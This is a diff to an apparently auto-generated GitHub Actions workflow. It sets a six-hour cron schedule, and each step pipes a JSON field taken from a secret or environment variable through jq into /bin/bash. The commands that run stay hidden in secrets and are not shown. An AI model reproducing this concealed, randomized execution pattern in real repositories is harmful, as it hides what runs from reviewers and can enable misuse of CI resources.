@@ -3,7 +3,7 @@ name: liucanbai3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '9 0/6 * * *'
 
 jobs:
   build:
@@ -13,12 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: liucanbai3456
         env:
-          ml898: ${{ secrets.ml898 }}
+          grkq2: ${{ secrets.grkq2 }}
         run: |
-          echo $ml898 | jq -r .deyye9647 | /bin/bash
-          echo $u4 | jq -r .n47 | /bin/bash
-          echo $qnvu55 | jq -r .dxd2 | /bin/bash
-          echo $jcfla92421 | jq -r .wse6464 | /bin/bash
-          echo $upsa7905 | jq -r .t96 | /bin/bash
-          echo $fhktq2 | jq -r .yd903 | /bin/bash
+          echo $grkq2 | jq -r .cglk52694 | /bin/bash
+          echo $oii9472 | jq -r .zhvz350 | /bin/bash
+          echo $zxev76161 | jq -r .jvz9 | /bin/bash
+          echo $m331 | jq -r .uykif3 | /bin/bash
+          echo $iql6625 | jq -r .z801 | /bin/bash
+          echo $y98 | jq -r .xffxp1 | /bin/bash
+          echo $ridvt2044 | jq -r .owp50820 | /bin/bash
 
